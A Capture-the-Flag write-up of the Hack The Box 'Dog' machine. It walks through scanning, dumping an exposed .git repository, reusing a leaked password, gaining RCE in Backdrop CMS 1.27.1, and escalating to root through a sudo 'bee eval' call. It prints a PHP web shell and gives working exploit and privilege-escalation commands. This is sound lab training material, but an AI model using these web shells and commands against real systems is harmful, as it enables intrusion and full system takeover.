![Capture d'écran 2025-05-03 162451](https://github.com/user-attachments/assets/dc90f493-9b22-4d83-9efe-edcdb3f6a031)

**Dog** is an **easy-level Linux machine** on **Hack The Box (HTB)** that provides a great introduction to **source code leakage**, **CMS exploitation**, and **basic privilege escalation techniques**. In this walkthrough, we’ll move from passive enumeration of public files like `.git`, to identifying hardcoded credentials, exploiting a known vulnerability in Backdrop CMS for Remote Code Execution (RCE), and finally leveraging misconfigured `sudo` permissions to gain full **root** access.

If you’re new to web application pentesting or looking to sharpen your post-exploitation and enumeration skills, this is a great box to sink your teeth into.

Let’s dive in and take down Dog! 🐶

---

### Initial enumeration

To start, I add the target's IP address to our `/etc/hosts` file and perform a full port scan using **nmap** :

```
nmap dog.htb -sV -sC -p- -oN nmapres
```
![Capture d'écran 2025-05-03 164947](https://github.com/user-attachments/assets/a298921d-b20a-4c87-b5ce-138fee0027cf)

Our initial ``nmap`` scan revealed two open ports:

**TCP 22 – SSH**  

This port is commonly used for secure remote login. It may allow us to connect directly to the machine if we discover valid credentials or a way to bypass authentication.
   
**TCP 80 – HTTP**  

A web service is running on this port. This typically indicates the presence of a website or web application, which we’ll explore further to identify potential vulnerabilities or misconfigurations.

#### Gobuster Enumeration 

After identifying port **80 (HTTP)** as open, I proceeded with a content discovery scan using ``gobuster`` to enumerate hidden or unlinked directories on the web server. The scan revealed several notable entries that give us insight into the web application's structure and potential vulnerabilities.

```bash
 gobuster dir -u http://dog.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusterres
```
![Capture d'écran 2025-05-03 170613](https://github.com/user-attachments/assets/8d43af8a-85a4-4e1b-a61b-da123c4285a6)

The scan revealed multiple interesting paths including `/modules/`, `/themes/`, `/files/`, `/sites/`, `/core/`, and `/layouts/`. These directory names strongly suggest that the website is powered by **Drupal**, an open-source content management system. Additionally, the discovery of a **`.git/`** directory indicated a potential source code leak, which can often be exploited to retrieve the full Git repository and expose sensitive files or credentials.

To complement the ``gobuster`` scan and catch any discrepancies or additional findings, I also ran ``dirsearch``, which uses a slightly different approach and wordlist.

```sh
dirsearch -u http://dog.htb
```
![Capture d'écran 2025-05-03 171922](https://github.com/user-attachments/assets/0d1f84ef-2491-4a94-a4ee-0994866f79a8)

``dirsearch`` confirmed the presence of the `.git` folder and further revealed accessible internal files such as `.git/config`, `.git/index`, `.git/logs/`, and `.git/refs/`, confirming that the directory is **fully exposed**. This is a critical misconfiguration that allows us to potentially **reconstruct the full source code history of the site**.

Moreover, `dirsearch` provided additional context by identifying publicly accessible files such as `index.php`, `README.md`, `LICENSE.txt`, and `robots.txt`, as well as Drupal-specific files like `settings.php`, which may contain database credentials or other sensitive information.

With both tools pointing us toward an exposed `.git/` directory and Drupal structure, the next logical step is to **dump and reconstruct the Git repository**. This will allow for deeper source code review and could reveal exploitable weaknesses or hardcoded secrets within the application.

#### Git Directory 

The `.git/` directory was accessible via both Gobuster and Dirsearch. This is a serious misconfiguration, as it allows remote users to access the version control metadata of the web application.

To exploit this, I used the `gitdumper` tool from the [GitTools suite](https://github.com/internetwache/GitTools/tree/master) to download the full contents of the exposed repository :

```sh
/opt/tools/GitTools/Dumper/gitdumper.sh http://dog.htb/.git/ ./repo_dog
```
![Capture d'écran 2025-05-03 174117](https://github.com/user-attachments/assets/3ff2b474-ff98-481e-9af7-1ec55aaf3a95)

The script successfully recovered key Git internals such as :

- `HEAD`, `config`, and `index`
- Commit logs and refs (e.g., `refs/heads/master`)

This allowed for **offline analysis of the source code**, even if the actual web server had directory listing disabled or the files had been removed from the document root. From here, I could investigate the application logic, search for hardcoded credentials, vulnerabilities (e.g., SQLi, RCE), or hidden endpoints that were not discoverable via brute-force.

#### Credentials
While analyzing the dumped `.git` repository, I came across a configuration file that revealed hardcoded database credentials :

![Capture d'écran 2025-05-03 193219](https://github.com/user-attachments/assets/6d84f65d-0d70-4140-a553-468aa84f2d9a)

Naturally, I attempted to use these credentials on the login portal available on `dog.htb`, assuming they might be reused for a web application account. Unfortunately, the login was unsuccessful...

Since these credentials didn’t grant us immediate access, I decided to continue our enumeration, hoping to find additional points of entry or more sensitive information elsewhere in the exposed repository.

Continuing the analysis of the `.git` repository, I examined the Git history using `git log`. The initial commit revealed the use of an internal email address :

![Capture d'écran 2025-05-03 194223](https://github.com/user-attachments/assets/aa251a36-7915-462d-aeba-a3afb514dc21)

This confirmed the domain `@dog.htb` as being associated with the organization. Based on this, I decided to search recursively through the repository for any other occurrences of email addresses tied to this domain :

```sh
grep -r "@dog.htb"
```

This search led to the discovery of another internal email address :

![Capture d'écran 2025-05-03 194613](https://github.com/user-attachments/assets/6a7b436d-e0f7-424f-9a30-f488249e18cb)

At this point, I hypothesized that this `user` could be another employee who worked on the project. With this potential username, I considered the possibility of password reuse, especially with the previously discovered database password.

![Capture d'écran 2025-05-03 194815](https://github.com/user-attachments/assets/12dfe2c6-4b01-45be-8698-0b02dd330ee3)

It worked! And we can see that we are admin of the website. 

--- 
### Initial foothold

While browsing the site using the **admin privileges** obtained through this account, I identified that the site is running **Backdrop CMS version 1.27.1**. This version detail is important, as it can be used to search for **known vulnerabilities** that might affect this specific CMS version.

![Capture d'écran 2025-05-03 203515](https://github.com/user-attachments/assets/5401bd96-c61d-4e89-b641-2ee18456e3da)

And I've found this **known vulnerabilities** : 

![Capture d'écran 2025-05-03 203852](https://github.com/user-attachments/assets/6ba71261-21b6-4de7-9634-4f2d9a42e7f7)

The code provides us with a `shell.php` file packaged inside a `.zip` archive. This `shell.php` file contains the following code, which enables **Remote Code Execution (RCE)** :

```python
<html>
  <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
      <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
    ?>
    </pre>
  </body>
</html>

```

After **downloading the proof-of-concept exploit** and carefully **reviewing its code** to understand its behavior and impact, I decided to **run the exploit against the target** to test if the vulnerability could be leveraged successfully.

```sh
python3 ./xploit.py http://dog.htb
```
![Capture d'écran 2025-05-03 204403](https://github.com/user-attachments/assets/af98c723-ac5d-475c-823d-6ef19bb4e7ee)

To upload our craft archive, I have to name our archive file like follow `name.tar.gz`

![Capture d'écran 2025-05-03 204720](https://github.com/user-attachments/assets/7c9ac5f4-629c-4449-a599-7670b33f866e)

But before uploading the archive, I need to replace the `shell.php` code with a reverse shell payload, such as the one provided by [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), instead of the basic RCE form.
![Capture d'écran 2025-05-03 210220](https://github.com/user-attachments/assets/232f2cd8-a7f1-4c08-aec9-40d61db92d47)

Now I can zip the archive in the expected format (`name.tar.gz`) using the following command :

```sh
tar -czvf shell.tar.gz shell/
```

The upload was successful :

![Capture d'écran 2025-05-03 210810](https://github.com/user-attachments/assets/9d7366eb-4cfb-4f2d-9557-d7ae9a14c874)

And as soon as it was accessed, I immediately received a reverse shell :

![Capture d'écran 2025-05-03 210838](https://github.com/user-attachments/assets/d14919ee-256d-4ce7-b6a5-ba3c50018f04)

---
### User flag 

After logging in, the `user` flag is only accessible when connected as `johncusack`, so our objective will be to find a way to escalate our privileges to that user :

![Capture d'écran 2025-05-03 214616](https://github.com/user-attachments/assets/15a3d43c-3202-4742-849d-31b01c6b58cc)

After checking for common privilege escalation vectors such as SUID binaries, cron jobs, and Linux capabilities, without finding anything useful I decided to try password reuse on the `johncusack` account using the credentials we previously discovered for the **Dog** portal. Surprisingly, it worked : 

![Capture d'écran 2025-05-03 220854](https://github.com/user-attachments/assets/1ac61cb6-6ea9-44c4-aee2-833951a6413d)

Once logged in as `johncusack`, I checked for `sudo` permissions and noticed that the user has elevated privileges on a custom script located at `/usr/local/bin/bee`. 

```bash
johncusack@dog:~$ sudo -l
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
johncusack@dog:~$
```

This means that `johncusack` can execute this script with `root` privileges.

![Capture d'écran 2025-05-03 222042](https://github.com/user-attachments/assets/66959725-2ea6-4306-a826-7f15bb108b56)

---
### Privilege escalation 

We can see that the script provides us the `eval` command : 

![Capture d'écran 2025-05-03 222252](https://github.com/user-attachments/assets/803ae1e6-67c1-484e-9ed9-d12f99036979)

This feature allows arbitrary PHP code execution, which we can leverage to escalate privileges. By invoking a system command through `eval`, we can easily spawn a root shell :

```sh
sudo /usr/local/bin/bee --root=/var/www/html ev "system('bash -p');"
```

This command gives us a root shell because `bash -p` preserves elevated privileges when executed with `sudo`.

---
### Root flag 

And we can finally get the `root` flag : 

![Capture d'écran 2025-05-03 224923](https://github.com/user-attachments/assets/959f23ac-e6f3-45ff-9995-32c492270c11)


---

**Congratulations!**  
This machine was a great opportunity to explore the risks of exposed development artifacts and insecure CMS deployments. From discovering a leaked `.git` directory to uncovering hardcoded credentials, we demonstrated how leftover configuration files can lead to initial access. By analyzing commit history and enumerating user information, we escalated through password reuse and gained administrative access to the web portal. Leveraging a known vulnerability in the CMS, we achieved Remote Code Execution, which ultimately allowed us to pivot to a shell on the target.

Through methodical privilege enumeration, we identified misconfigured `sudo` permissions that led to a full root compromise, showcasing once again how minor oversights can result in complete system takeover.

A satisfying challenge that reinforces the importance of secure development practices and thorough enumeration.

Thanks for reading, and happy hacking!

![Capture d'écran 2025-05-03 225108](https://github.com/user-attachments/assets/29d9bb84-b37a-4304-9a0c-daa469ff5459)

